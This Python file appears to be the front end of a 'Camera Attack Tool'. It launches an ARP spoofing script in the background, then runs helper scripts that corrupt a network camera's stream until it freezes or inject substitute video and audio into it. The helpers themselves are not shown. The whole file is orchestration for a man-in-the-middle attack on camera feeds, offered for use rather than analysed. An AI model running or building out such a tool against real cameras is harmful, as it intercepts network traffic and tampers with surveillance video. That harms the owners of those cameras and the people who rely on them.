import argparse
import subprocess
import sys
import time
import signal

def main():
    parser = argparse.ArgumentParser(description="Camera Attack Tool")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--freeze", action="store_true", help="Corrupt the camera stream until it freezes")
    group.add_argument("-v", "--video", action="store_true", help="Inject a funny video stream into the camera")
    group.add_argument("-va", "--video-audio", action="store_true", help="Inject a funny video stream with sound into the camera")

    args = parser.parse_args()

    print("--- Starting arp_spoofing.py (Background Process) ---")
    # Popen starts the process and lets this script continue immediately
    arp = subprocess.Popen([sys.executable, "arp_spoofing.py"])

    print("Waiting for arp_spoofing.py to start...")
    time.sleep(5)

    try: 
        if args.freeze:
            subprocess.run([sys.executable, "corrupt.py"], check=True)

        elif args.video:
            subprocess.run([sys.executable, "injector.py"], check=True)

        elif args.video_audio:
            injector = subprocess.Popen([sys.executable, "injector.py"])
            audio_injector = subprocess.Popen([sys.executable, "audio_injector.py"])

            injector.wait()
            audio_injector.wait()

    except KeyboardInterrupt:
        print("\nProcess interrupted by user.")

    finally:
        # Cleanup
        if arp.poll() is None:
            arp.terminate()
            arp.wait()
        else:
            print("\n--- arp_spoofing.py had already finished. Exiting. ---")

if __name__ == "__main__":
    main()